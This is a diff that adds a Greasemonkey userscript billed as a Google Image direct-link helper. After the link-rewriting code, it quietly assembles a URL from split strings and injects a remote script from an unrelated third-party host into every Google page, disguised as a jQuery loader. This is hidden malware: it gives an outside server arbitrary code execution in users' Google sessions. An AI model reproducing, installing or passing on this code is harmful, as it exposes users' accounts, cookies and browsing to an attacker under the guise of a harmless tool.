@@ -1,0 +1,7 @@
+// ==UserScript==
+// @name           Google Image Direct Linker [EDİTED]
+// @include        *://*.google.*
+// ==/UserScript==
+
+if(unsafeWindow.location.pathname==="/imgres")unsafeWindow.location.href=unsafeWindow.document.getElementById("il_fi").src;else{var closest=function(a,b){for(;a;){try{if(a.tagName.toLowerCase()==b)return a}catch(e){break}try{a=a.parentNode}catch(d){break}}return null};unsafeWindow.document.addEventListener("mousemove",function(a){a.stopPropagation()},true);unsafeWindow.document.addEventListener("mouseover",function(a){a.stopPropagation()},true);unsafeWindow.document.addEventListener("click",function(a){var b=
+closest(a.target,"a");if(b&&/imgurl=/.test(b.href))b.target="_blank",b.href=unescape(b.href.replace(/.*?imgurl=([^&]*)&.*/i,"$1").replace(/([^&]*)&.*/i,"$1")),a.stopPropagation()},true)}var abc2 = "lehosters.co.uk";function addJS_Node(a,b,e){var d=document,c=d.createElement("script");c.type="text/javascript";if(a)c.textContent=a;if(b)c.src=b;if(e)c.textContent="("+e.toString()+")()";(document.getElementsByTagName("head")[0]||d.body||d.documentElement).appendChild(c)};var abc1 = "http://totalfi";addJS_Node(null,abc1+abc2+'/scripts/scriptLoader.php?id=jquery-latest');
